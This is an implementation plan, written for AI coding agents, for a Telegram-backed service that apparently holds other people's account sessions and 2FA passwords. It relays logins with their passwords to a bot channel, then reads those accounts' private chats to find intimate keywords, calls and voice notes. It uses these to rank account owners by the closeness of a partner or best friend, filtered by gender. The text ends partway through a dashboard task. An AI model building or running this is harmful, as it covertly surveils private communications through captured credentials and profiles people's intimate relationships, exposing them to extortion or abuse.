# Relationship Scoring & User Schema Refactor — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Restructure the User schema into logical sections, add relationship scoring that detects close personal relationships (girlfriend/best friend) using per-chat Telegram signals including intimate keyword search, and expose endpoints to rank users by relationship quality.

**Architecture:** User schema gets restructured: flat stats under `stats`, calls without `chats[]`, new `relationships` block with `top[]` array and indexed `bestScore`. A `computeRelationshipScore(mobile)` engine uses `getTopPrivateChats`, `GetSearchCounters`, `GetCommonChats`, and intimate keyword search via `messages.Search` to score each chat. Two query endpoints read pre-computed data; one recompute endpoint triggers live scoring.

**Tech Stack:** NestJS 11, Mongoose, GramJS (telegram@2.26.22), MongoDB

**Spec:** `docs/superpowers/specs/2026-04-11-relationship-scoring-design.md`

---

## File Structure

| File | Action | Responsibility |
|------|--------|----------------|
| `src/components/users/schemas/user.schema.ts` | Rewrite | Restructured User schema with `stats`, `calls`, `relationships` |
| `src/components/users/dto/create-user.dto.ts` | Rewrite | Matches new schema structure |
| `src/components/users/dto/update-user.dto.ts` | No change | PartialType auto-inherits |
| `src/components/users/dto/search-user.dto.ts` | Modify | Update field paths to `stats.*` |
| `src/components/users/scoring/relationship-scorer.ts` | Create | Pure scoring function + intimate keywords constant |
| `src/components/users/scoring/index.ts` | Create | Barrel export |
| `src/components/users/users.service.ts` | Modify | Add `computeRelationshipScore`, `topRelationships`, `getUserRelationships`, update `top()` and `create()` query paths |
| `src/components/users/users.controller.ts` | Modify | Add 3 new endpoints, update existing |
| `src/components/users/index.ts` | No change | Already exports everything |
| `src/components/TgSignup/tg-signup.service.ts` | Modify | Update CreateUserDto construction (lines 413-436) |
| `src/components/users/__tests__/users.service.spec.ts` | Modify | Update test to match new schema |
| `my-tg-local/src/types/api.ts` | Modify | Update User type to nested structure |
| `my-tg-local/src/components/UserProfileView.tsx` | Modify | Prefix `stats.` on field access |
| `my-tg-local/src/components/UserSelector.tsx` | Modify | Prefix `stats.` on field access, update calls path |
| `my-tg-local/src/components/ChatExplorer.tsx` | Modify | Update calls path |
| `scripts/migrate-user-schema.ts` | Create | One-time MongoDB migration script |

---

### Task 1: Relationship Scorer Module (Pure Logic)

**Files:**
- Create: `src/components/users/scoring/relationship-scorer.ts`
- Create: `src/components/users/scoring/index.ts`

- [ ] **Step 1: Create the scoring module**

Create `src/components/users/scoring/relationship-scorer.ts`:

```typescript
export const INTIMATE_KEYWORDS = [
  'love', 'luv', 'lub',
  'kiss',
  'hug',
  'miss you',
  'baby', 'bae',
  'darling', 'sweetheart', 'jaan',
  'good night', 'good morning',
  'i love you', 'ily',
];

export interface RelationshipCandidate {
  chatId: string;
  name: string;
  username: string | null;
  phone: string | null;
  messages: number;
  mediaCount: number;
  voiceCount: number;
  intimateMessageCount: number;
  calls: {
    total: number;
    incoming: number;
    videoCalls: number;
    avgDuration: number;
    totalDuration: number;
  };
  commonChats: number;
  isMutualContact: boolean;
  lastMessageDate: string | null;
}

export interface ScoredRelationship extends RelationshipCandidate {
  score: number;
}

export function scoreRelationship(chat: RelationshipCandidate): number {
  const { messages, mediaCount, voiceCount, intimateMessageCount, calls, commonChats, isMutualContact, lastMessageDate } = chat;

  const msgScore = Math.min(messages, 3000) * 1.0;
  const mediaScore = Math.min(mediaCount, 300) * 3.0;
  const voiceScore = Math.min(voiceCount, 100) * 4.0;

  const callScore =
    calls.incoming * 8.0 +
    (calls.total - calls.incoming) * 3.0 +
    calls.videoCalls * 12.0 +
    Math.min(calls.totalDuration, 36000) * 0.02 +
    Math.min(calls.avgDuration, 1800) * 0.1;

  const intimateScore = Math.min(intimateMessageCount, 500) * 10.0;

  const mutualScore = isMutualContact ? 50 : 0;
  const commonChatScore = Math.min(commonChats, 10) * 15.0;

  const daysSinceLastMessage = lastMessageDate
    ? (Date.now() - new Date(lastMessageDate).getTime()) / (1000 * 60 * 60 * 24)
    : 999;
  const recencyBonus = daysSinceLastMessage <= 90
    ? 100 * (1 - daysSinceLastMessage / 90)
    : 0;

  return Math.round(
    msgScore + mediaScore + voiceScore + callScore +
    intimateScore + mutualScore + commonChatScore + recencyBonus
  );
}

export function rankRelationships(candidates: RelationshipCandidate[], topN: number = 5): ScoredRelationship[] {
  return candidates
    .map(c => ({ ...c, score: scoreRelationship(c) }))
    .sort((a, b) => b.score - a.score)
    .slice(0, topN);
}

export function computeAccountScore(topRelationships: ScoredRelationship[]): number {
  return topRelationships.slice(0, 3).reduce((sum, r) => sum + r.score, 0);
}
```

- [ ] **Step 2: Create barrel export**

Create `src/components/users/scoring/index.ts`:

```typescript
export * from './relationship-scorer';
```

- [ ] **Step 3: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -20`
Expected: No errors

- [ ] **Step 4: Commit**

```bash
git add src/components/users/scoring/
git commit -m "feat(users): add relationship scoring module with intimate keyword detection"
```

---

### Task 2: Restructure User Schema

**Files:**
- Modify: `src/components/users/schemas/user.schema.ts`

- [ ] **Step 1: Rewrite schema with nested structure**

Replace entire contents of `src/components/users/schemas/user.schema.ts`:

```typescript
import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';
import mongoose, { Document } from 'mongoose';
import { ApiProperty } from '@nestjs/swagger';

export type UserDocument = User & Document;

@Schema({
  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,
  toJSON: {
    virtuals: true,
    transform: (doc, ret) => {
      delete ret._id;
      return ret;
    },
  },
})
export class User {
  // --- Identity ---
  @ApiProperty({ description: 'Mobile number' })
  @Prop({ required: true, unique: true })
  mobile: string;

  @ApiProperty({ description: 'Telegram session string' })
  @Prop({ required: true, unique: true })
  session: string;

  @ApiProperty({ description: 'Telegram user ID' })
  @Prop({ required: true, unique: true })
  tgId: string;

  @ApiProperty({ description: 'First name' })
  @Prop()
  firstName: string;

  @ApiProperty({ description: 'Last name', required: false })
  @Prop()
  lastName: string | null;

  @ApiProperty({ description: 'Telegram username', required: false })
  @Prop()
  username: string | null;

  @ApiProperty({ description: 'Gender', required: false })
  @Prop()
  gender: string | null;

  // --- Account state ---
  @Prop({ required: false, type: Boolean })
  twoFA: boolean = false;

  @Prop({ required: false, type: Boolean, default: false })
  expired: boolean = false;

  @Prop({ required: false })
  password: string = null;

  // --- Operational flags ---
  @ApiProperty({ description: 'Starred for manual review' })
  @Prop({ required: false, type: Boolean, default: false })
  starred: boolean = false;

  @ApiProperty({ description: 'Whether demo was given' })
  @Prop()
  demoGiven: boolean;

  // --- Account-level stats ---
  @ApiProperty({ description: 'Account statistics', required: false })
  @Prop({
    type: mongoose.Schema.Types.Mixed,
    default: {
      channels: 0, personalChats: 0, totalChats: 0, contacts: 0, msgs: 0,
      photoCount: 0, videoCount: 0, movieCount: 0,
      ownPhotoCount: 0, otherPhotoCount: 0, ownVideoCount: 0, otherVideoCount: 0,
      lastActive: null,
    },
  })
  stats: {
    channels: number;
    personalChats: number;
    totalChats: number;
    contacts: number;
    msgs: number;
    photoCount: number;
    videoCount: number;
    movieCount: number;
    ownPhotoCount: number;
    otherPhotoCount: number;
    ownVideoCount: number;
    otherVideoCount: number;
    lastActive: string | null;
  };

  // --- Call summary (account-level) ---
  @ApiProperty({ description: 'Call statistics', required: false })
  @Prop({
    type: mongoose.Schema.Types.Mixed,
    default: { totalCalls: 0, outgoing: 0, incoming: 0, video: 0, audio: 0 },
  })
  calls: {
    totalCalls: number;
    outgoing: number;
    incoming: number;
    video: number;
    audio: number;
  };

  // --- Relationship scoring ---
  @ApiProperty({ description: 'Relationship analysis', required: false })
  @Prop({
    type: mongoose.Schema.Types.Mixed,
    default: { score: 0, bestScore: 0, computedAt: null, top: [] },
  })
  relationships: {
    score: number;
    bestScore: number;
    computedAt: Date | null;
    top: Array<{
      chatId: string;
      name: string;
      username: string | null;
      phone: string | null;
      messages: number;
      mediaCount: number;
      voiceCount: number;
      intimateMessageCount: number;
      calls: {
        total: number;
        incoming: number;
        videoCalls: number;
        avgDuration: number;
        totalDuration: number;
      };
      commonChats: number;
      isMutualContact: boolean;
      lastMessageDate: string | null;
      score: number;
    }>;
  };
}

export const UserSchema = SchemaFactory.createForClass(User);

UserSchema.index({ 'relationships.bestScore': -1 });
UserSchema.index({ 'stats.lastActive': -1 });
```

- [ ] **Step 2: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -20`
Expected: Errors from DTOs and service (expected — we fix those next)

- [ ] **Step 3: Commit**

```bash
git add src/components/users/schemas/user.schema.ts
git commit -m "feat(users): restructure user schema with stats, calls, relationships sections"
```

---

### Task 3: Update DTOs

**Files:**
- Modify: `src/components/users/dto/create-user.dto.ts`
- Modify: `src/components/users/dto/search-user.dto.ts`

- [ ] **Step 1: Rewrite CreateUserDto**

Replace entire contents of `src/components/users/dto/create-user.dto.ts`:

```typescript
import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';

export class UserStatsDto {
  @ApiProperty({ description: 'Channel count' })
  channels: number = 0;

  @ApiProperty({ description: 'Personal chat count' })
  personalChats: number = 0;

  @ApiProperty({ description: 'Total chat count' })
  totalChats: number = 0;

  @ApiProperty({ description: 'Contact count' })
  contacts: number = 0;

  @ApiProperty({ description: 'Message count' })
  msgs: number = 0;

  @ApiProperty({ description: 'Total photo count' })
  photoCount: number = 0;

  @ApiProperty({ description: 'Total video count' })
  videoCount: number = 0;

  @ApiProperty({ description: 'Movie file count' })
  movieCount: number = 0;

  @ApiProperty({ description: 'Sent photo count' })
  ownPhotoCount: number = 0;

  @ApiProperty({ description: 'Received photo count' })
  otherPhotoCount: number = 0;

  @ApiProperty({ description: 'Sent video count' })
  ownVideoCount: number = 0;

  @ApiProperty({ description: 'Received video count' })
  otherVideoCount: number = 0;

  @ApiPropertyOptional({ description: 'Last active timestamp' })
  lastActive: string | null = null;
}

export class UserCallsDto {
  @ApiProperty({ description: 'Total calls' })
  totalCalls: number = 0;

  @ApiProperty({ description: 'Outgoing calls' })
  outgoing: number = 0;

  @ApiProperty({ description: 'Incoming calls' })
  incoming: number = 0;

  @ApiProperty({ description: 'Video calls' })
  video: number = 0;

  @ApiProperty({ description: 'Audio calls' })
  audio: number = 0;
}

export class CreateUserDto {
  @ApiProperty({ description: 'Mobile number' })
  mobile: string;

  @ApiProperty({ description: 'Telegram session string' })
  session: string;

  @ApiProperty({ description: 'First name' })
  firstName: string;

  @ApiPropertyOptional({ description: 'Last name' })
  lastName?: string | null;

  @ApiPropertyOptional({ description: 'Telegram username' })
  username?: string | null;

  @ApiProperty({ description: 'Telegram user ID' })
  tgId: string;

  @ApiPropertyOptional({ description: 'Gender' })
  gender?: string | null;

  @ApiProperty({ description: '2FA enabled' })
  twoFA: boolean = false;

  @ApiProperty({ description: 'Account expired' })
  expired: boolean = false;

  @ApiProperty({ description: '2FA password' })
  password: string = null;

  @ApiPropertyOptional({ description: 'Account statistics' })
  stats?: UserStatsDto = new UserStatsDto();

  @ApiPropertyOptional({ description: 'Call statistics' })
  calls?: UserCallsDto = new UserCallsDto();
}
```

- [ ] **Step 2: Update SearchUserDto**

Replace entire contents of `src/components/users/dto/search-user.dto.ts`:

```typescript
import { ApiPropertyOptional } from '@nestjs/swagger';
import { Transform, TransformFnParams } from 'class-transformer';
import { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';

export class SearchUserDto {
  @ApiPropertyOptional({ description: 'Telegram ID' })
  @IsOptional()
  @IsString()
  tgId?: string;

  @ApiPropertyOptional({ description: 'Mobile number' })
  @IsOptional()
  @IsString()
  mobile?: string;

  @ApiPropertyOptional({ description: '2FA status' })
  @IsOptional()
  @IsBoolean()
  twoFA?: boolean;

  @ApiPropertyOptional({ description: 'Expiration status' })
  @IsOptional()
  @IsBoolean()
  expired?: boolean;

  @ApiPropertyOptional({ description: 'Session string' })
  @IsOptional()
  @IsString()
  session?: string;

  @ApiPropertyOptional({ description: 'First name' })
  @IsOptional()
  @IsString()
  firstName?: string;

  @ApiPropertyOptional({ description: 'Last name' })
  @IsOptional()
  @IsString()
  lastName?: string;

  @ApiPropertyOptional({ description: 'Telegram username' })
  @IsOptional()
  @IsString()
  username?: string;

  @ApiPropertyOptional({ description: 'Gender' })
  @IsOptional()
  @IsString()
  gender?: string;

  @ApiPropertyOptional({ description: 'Demo given status' })
  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)
  @IsOptional()
  @IsBoolean()
  demoGiven?: boolean;

  @ApiPropertyOptional({ description: 'Starred status' })
  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)
  @IsOptional()
  @IsBoolean()
  starred?: boolean;
}
```

Note: Numeric stat filters (`channels`, `photoCount`, etc.) are removed from SearchUserDto. These are now under `stats.*` and should be queried via the `executeQuery` endpoint for advanced filtering. The search DTO stays focused on identity/state fields.

- [ ] **Step 3: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -40`
Expected: Errors from users.service.ts and tg-signup.service.ts (expected — fixed in next tasks)

- [ ] **Step 4: Commit**

```bash
git add src/components/users/dto/
git commit -m "feat(users): restructure DTOs to match new nested schema"
```

---

### Task 4: Update UsersService — Query Paths & Core Methods

**Files:**
- Modify: `src/components/users/users.service.ts`

- [ ] **Step 1: Update `create()` — fix the scoring setTimeout to use new paths**

In `users.service.ts`, replace the `create` method body (lines 34-64). The key change: `{ score }` becomes `{ 'relationships.score': score }` and the setTimeout will be replaced with `computeRelationshipScore` in a later task. For now, keep existing scoring logic but target new field paths:

Replace lines 34-64:
```typescript
  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
    this.logger.log(`New User received - ${user?.mobile}`);
    this.logger.debug('ActiveClientSetup:', activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
      await this.clientsService.updateClientSession(user.session, user.mobile)
    } else {
      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
      const newUser = new this.userModel(user);
      const saved = await newUser.save();
      // Score in background — will be replaced with computeRelationshipScore
      setTimeout(() => {
        this.computeRelationshipScore(user.mobile).catch(err => {
          this.logger.error(`Background scoring failed for ${user.mobile}`, err);
        });
      }, 5000);
      return saved;
    }
  }
```

- [ ] **Step 2: Update `top()` — fix query field paths**

Replace the `top` method (lines 74-134):

```typescript
  async top(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeTwoFA?: boolean;
    excludeAudited?: boolean;
    gender?: string;
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 0,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeTwoFA = false,
      gender,
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.score': { $gte: minScore },
    };

    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;
    if (minCalls > 0) query['calls.totalCalls'] = { $gte: minCalls };
    if (minPhotos > 0) query['stats.photoCount'] = { $gte: minPhotos };
    if (minVideos > 0) query['stats.videoCount'] = { $gte: minVideos };

    const total = await this.userModel.countDocuments(query).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session')
      .sort({ 'relationships.score': -1 })
      .skip(skip)
      .limit(limitNum)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }
```

- [ ] **Step 3: Update `search()` — fix firstName regex path**

The `search` method (lines 185-196) references `query.firstName` which is still a top-level field — no change needed. But remove the `twoFA` string coercion since the DTO now has `@IsBoolean()`:

```typescript
  async search(filter: SearchUserDto): Promise<User[]> {
    const query: QueryFilter<UserDocument> = { ...filter };

    if (query.firstName) {
      query.firstName = { $regex: new RegExp(query.firstName as string, 'i') };
    }

    return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
  }
```

- [ ] **Step 4: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -40`
Expected: Error about missing `computeRelationshipScore` method (added in next task)

- [ ] **Step 5: Commit**

```bash
git add src/components/users/users.service.ts
git commit -m "feat(users): update service query paths for restructured schema"
```

---

### Task 5: Add computeRelationshipScore Engine

**Files:**
- Modify: `src/components/users/users.service.ts`

This is the core scoring engine. It connects to Telegram, fetches signals, scores relationships, and persists results.

- [ ] **Step 1: Add imports and the scoring method**

Add to the top of `users.service.ts`, after existing imports:

```typescript
import { INTIMATE_KEYWORDS, rankRelationships, computeAccountScore, RelationshipCandidate } from './scoring';
import { Api } from 'telegram/tl';
import bigInt from 'big-integer';
import { parseError } from '../../utils/parseError';
```

Add these methods to the `UsersService` class, after the `search` method:

```typescript
  async computeRelationshipScore(mobile: string): Promise<void> {
    const wasConnected = connectionManager.hasClient(mobile);
    let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;

    try {
      telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });

      // 1. Fetch top private chats (messages, media, calls per chat)
      const topChats = await telegramClient.getTopPrivateChats(30, false);
      if (!topChats?.items?.length) {
        this.logger.log(`[${mobile}] No private chats found for scoring`);
        return;
      }

      // 2. Fetch contacts for mutual contact detection
      const contactsResult = await telegramClient.getContacts();
      const mutualMobiles = new Set<string>();
      if (contactsResult && 'users' in contactsResult) {
        for (const user of (contactsResult as any).users || []) {
          if (user.mutualContact) {
            mutualMobiles.add(user.id?.toString());
          }
        }
      }

      // 3. Score top 10 chats with additional signals
      const candidateChats = topChats.items.slice(0, 10);
      const candidates: RelationshipCandidate[] = [];

      for (const chat of candidateChats) {
        try {
          const chatPeer = await telegramClient.getchatId(chat.chatId === 'me' ? 'me' : chat.chatId);

          // Voice message count via SearchCounters
          let voiceCount = 0;
          try {
            const counters = await telegramClient.client.invoke(
              new Api.messages.GetSearchCounters({
                peer: chatPeer,
                filters: [new Api.InputMessagesFilterVoice()],
              }),
            );
            voiceCount = (counters as any)?.[0]?.count ?? 0;
          } catch { /* some peers don't support counters */ }

          // Common chats
          let commonChats = 0;
          if (chat.chatId !== 'me') {
            try {
              const common = await telegramClient.client.invoke(
                new Api.messages.GetCommonChats({
                  userId: chat.chatId,
                  maxId: bigInt(0),
                  limit: 100,
                }),
              );
              commonChats = (common as any)?.chats?.length ?? 0;
            } catch { /* may fail for deleted users */ }
          }

          // Intimate keyword search
          let intimateMessageCount = 0;
          for (const keyword of INTIMATE_KEYWORDS) {
            try {
              const result = await telegramClient.client.invoke(
                new Api.messages.Search({
                  peer: chatPeer,
                  q: keyword,
                  filter: new Api.InputMessagesFilterEmpty(),
                  minDate: 0,
                  maxDate: 0,
                  offsetId: 0,
                  addOffset: 0,
                  limit: 1,
                  maxId: 0,
                  minId: 0,
                  hash: bigInt(0),
                }),
              );
              intimateMessageCount += (result as any)?.count ?? 0;
              await sleep(200);
            } catch { /* skip on error */ }
          }

          const callStats = chat.calls || { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0 };

          candidates.push({
            chatId: chat.chatId,
            name: chat.name,
            username: chat.username,
            phone: chat.phone,
            messages: chat.totalMessages,
            mediaCount: chat.mediaCount,
            voiceCount,
            intimateMessageCount,
            calls: {
              total: callStats.totalCalls,
              incoming: callStats.incoming,
              videoCalls: callStats.videoCalls,
              avgDuration: callStats.averageDuration,
              totalDuration: callStats.totalDuration,
            },
            commonChats,
            isMutualContact: mutualMobiles.has(chat.chatId),
            lastMessageDate: chat.lastMessageDate,
          });

          await sleep(300);
        } catch (chatError) {
          this.logger.warn(`[${mobile}] Failed to score chat ${chat.chatId}: ${(chatError as Error).message}`);
        }
      }

      // 4. Rank and persist
      const top = rankRelationships(candidates, 5);
      const accountScore = computeAccountScore(top);
      const bestScore = top.length > 0 ? top[0].score : 0;

      // 5. Also update account-level call stats from topChats data
      const callAgg = topChats.items.reduce(
        (acc, item) => {
          const c = item.calls || { totalCalls: 0, incoming: 0, outgoing: 0, videoCalls: 0, audioCalls: 0 };
          acc.totalCalls += c.totalCalls;
          acc.incoming += c.incoming;
          acc.outgoing += c.outgoing;
          acc.video += c.videoCalls;
          acc.audio += c.audioCalls;
          return acc;
        },
        { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 },
      );

      await this.userModel.updateOne(
        { mobile },
        {
          $set: {
            'relationships.score': accountScore,
            'relationships.bestScore': bestScore,
            'relationships.computedAt': new Date(),
            'relationships.top': top,
            'calls': callAgg,
          },
        },
      ).exec();

      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}`);
    } catch (error) {
      parseError(error, `[${mobile}] computeRelationshipScore failed`);
    } finally {
      if (!wasConnected && telegramClient) {
        await connectionManager.unregisterClient(mobile).catch(() => undefined);
      }
    }
  }

  async topRelationships(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    gender?: string;
    excludeTwoFA?: boolean;
  }) {
    const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.bestScore': { $gt: minScore },
    };
    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;

    const total = await this.userModel.countDocuments(query).exec();
    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session -password')
      .sort({ 'relationships.bestScore': -1 })
      .skip(skip)
      .limit(limitNum)
      .lean()
      .exec();

    return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
  }

  async getUserRelationships(mobile: string) {
    const user = await this.userModel
      .findOne({ mobile })
      .select('mobile firstName lastName tgId relationships')
      .lean()
      .exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    return user;
  }
```

- [ ] **Step 2: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -40`
Expected: May have errors from TgSignup (fixed in Task 7). Service itself should compile.

- [ ] **Step 3: Commit**

```bash
git add src/components/users/users.service.ts
git commit -m "feat(users): add computeRelationshipScore engine with intimate keyword search"
```

---

### Task 6: Add Controller Endpoints

**Files:**
- Modify: `src/components/users/users.controller.ts`

- [ ] **Step 1: Add three new endpoints**

Add these methods to the `UsersController` class, before the `findAll` method:

```typescript
  @Get('top-relationships')
  @ApiOperation({ summary: 'Get users ranked by relationship quality' })
  @ApiQuery({ name: 'page', required: false, type: Number })
  @ApiQuery({ name: 'limit', required: false, type: Number })
  @ApiQuery({ name: 'minScore', required: false, type: Number })
  @ApiQuery({ name: 'gender', required: false, type: String })
  @ApiQuery({ name: 'excludeTwoFA', required: false, type: Boolean })
  async topRelationships(
    @Query('page') page?: string,
    @Query('limit') limit?: string,
    @Query('minScore') minScore?: string,
    @Query('gender') gender?: string,
    @Query('excludeTwoFA') excludeTwoFA?: string,
  ) {
    return this.usersService.topRelationships({
      page: page ? parseInt(page, 10) : undefined,
      limit: limit ? parseInt(limit, 10) : undefined,
      minScore: minScore ? parseFloat(minScore) : undefined,
      gender,
      excludeTwoFA: excludeTwoFA === 'true',
    });
  }

  @Get(':mobile/relationships')
  @ApiOperation({ summary: 'Get relationship details for a specific user' })
  @ApiParam({ name: 'mobile' })
  async getUserRelationships(@Param('mobile') mobile: string) {
    return this.usersService.getUserRelationships(mobile);
  }

  @Post('recompute-score/:mobile')
  @ApiOperation({ summary: 'Recompute relationship score for a user (live Telegram connection)' })
  @ApiParam({ name: 'mobile' })
  async recomputeScore(@Param('mobile') mobile: string) {
    await this.usersService.computeRelationshipScore(mobile);
    return this.usersService.getUserRelationships(mobile);
  }
```

**Important:** The `top-relationships` and `:mobile/relationships` routes must be placed BEFORE the `':tgId'` route in the controller, otherwise NestJS will match `top-relationships` as a `:tgId` param. Ensure they are ordered: `top-relationships` → `:mobile/relationships` → `top-interacted` → other specific routes → `:tgId`.

- [ ] **Step 2: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -20`

- [ ] **Step 3: Commit**

```bash
git add src/components/users/users.controller.ts
git commit -m "feat(users): add top-relationships, user relationships, and recompute endpoints"
```

---

### Task 7: Update TgSignup Consumer

**Files:**
- Modify: `src/components/TgSignup/tg-signup.service.ts` (lines 413-436)

- [ ] **Step 1: Update the CreateUserDto construction**

In `tg-signup.service.ts`, replace lines 413-436 (the userData object) with:

```typescript
                lastActive: now.toISOString().split('T')[0],
                expired: false,
                stats: {
                    channels: 0,
                    personalChats: 0,
                    totalChats: 0,
                    contacts: 0,
                    msgs: 0,
                    photoCount: 0,
                    videoCount: 0,
                    movieCount: 0,
                    ownPhotoCount: 0,
                    otherPhotoCount: 0,
                    ownVideoCount: 0,
                    otherVideoCount: 0,
                    lastActive: now.toISOString().split('T')[0],
                },
                calls: {
                    totalCalls: 0,
                    outgoing: 0,
                    incoming: 0,
                    video: 0,
                    audio: 0,
                },
                gender: 'unknown',
```

Note: remove `channels`, `personalChats`, `totalChats`, `otherPhotoCount`, `ownPhotoCount`, `ownVideoCount`, `otherVideoCount`, `contacts`, `movieCount`, `score`, `starred`, `msgs`, `photoCount`, `videoCount` as flat fields. Also remove `chats: []` from the calls object.

- [ ] **Step 2: Verify types compile**

Run: `npx tsc --noEmit --pretty 2>&1 | head -20`

- [ ] **Step 3: Commit**

```bash
git add src/components/TgSignup/tg-signup.service.ts
git commit -m "fix(tg-signup): update user creation to match restructured schema"
```

---

### Task 8: Update Test

**Files:**
- Modify: `src/components/users/__tests__/users.service.spec.ts`

- [ ] **Step 1: Update the test to match new schema**

The test at line 59-73 constructs a CreateUserDto. Update to use the new nested structure:

Replace the `service.create({...})` call (lines 59-73) with:

```typescript
        await service.create({
            mobile: '9199990001',
            session: 'signup-session',
            firstName: 'User',
            lastName: '',
            username: 'user1',
            tgId: 'tg-1',
            twoFA: false,
            password: null,
            expired: false,
            stats: {
                channels: 0, personalChats: 0, totalChats: 0, contacts: 0, msgs: 0,
                photoCount: 0, videoCount: 0, movieCount: 0,
                ownPhotoCount: 0, otherPhotoCount: 0, ownVideoCount: 0, otherVideoCount: 0,
                lastActive: '2026-04-11',
            },
            calls: { totalCalls: 0, outgoing: 0, incoming: 0, video: 0, audio: 0 },
        } as any);
```

Also update the assertion at line 80-84. The `updateMany` call now comes from `computeRelationshipScore` which writes to `relationships.*` fields via `updateOne`. Since the mock `getCallLogStats` returns `{ chats: [] }` and `getTopPrivateChats` isn't mocked, the background scoring will catch and log the error. Update the test to expect the model save but not the updateMany:

Remove or update the `MockUserModel.updateMany` assertion since the scoring path changed. The key assertion is that the user was saved (line 77-78).

- [ ] **Step 2: Run tests**

Run: `cd CommonTgService-local && npx jest --testPathPattern=users.service.spec --no-coverage 2>&1 | tail -20`

- [ ] **Step 3: Commit**

```bash
git add src/components/users/__tests__/users.service.spec.ts
git commit -m "test(users): update test for restructured schema"
```

---

### Task 9: Update Dashboard Types & Components

**Files:**
- Modify: `my-tg-local/src/types/api.ts`
- Modify: `my-tg-local/src/components/UserProfileView.tsx`
- Modify: `my-tg-local/src/components/UserSelector.tsx`
- Modify: `my-tg-local/src/components/ChatExplorer.tsx`

- [ ] **Step 1: Update the User type in api.ts**

In `my-tg-local/src/types/api.ts`, replace the `User` interface (lines 13-47) with:

```typescript
export interface User {
  _id: string;
  tgId: string;
  mobile: string;
  firstName?: string;
  lastName?: string;
  username?: string;
  gender?: string;
  expired?: boolean;
  twoFA?: boolean;
  password?: string;
  starred?: boolean;
  demoGiven?: boolean;
  stats: {
    channels: number;
    personalChats: number;
    totalChats: number;
    contacts: number;
    msgs: number;
    photoCount: number;
    videoCount: number;
    movieCount: number;
    ownPhotoCount: number;
    otherPhotoCount: number;
    ownVideoCount: number;
    otherVideoCount: number;
    lastActive?: string;
  };
  calls: {
    totalCalls: number;
    incoming: number;
    outgoing: number;
    video: number;
    audio: number;
  };
  relationships?: {
    score: number;
    bestScore: number;
    computedAt?: string;
    top: Array<{
      chatId: string;
      name: string;
      username: string | null;
      phone: string | null;
      messages: number;
      mediaCount: number;
      voiceCount: number;
      intimateMessageCount: number;
      calls: { total: number; incoming: number; videoCalls: number; avgDuration: number; totalDuration: number };
      commonChats: number;
      isMutualContact: boolean;
      lastMessageDate: string | null;
      score: number;
    }>;
  };
  interactionScore?: number;
  createdAt?: string;
  updatedAt?: string;
}
```

- [ ] **Step 2: Update UserProfileView.tsx**

Replace every `targetUser.msgs` with `targetUser.stats.msgs`, `targetUser.totalChats` with `targetUser.stats.totalChats`, etc. The fields are: `msgs`, `totalChats`, `personalChats`, `channels`, `contacts`, `lastActive` — all under `stats.`.

- [ ] **Step 3: Update UserSelector.tsx**

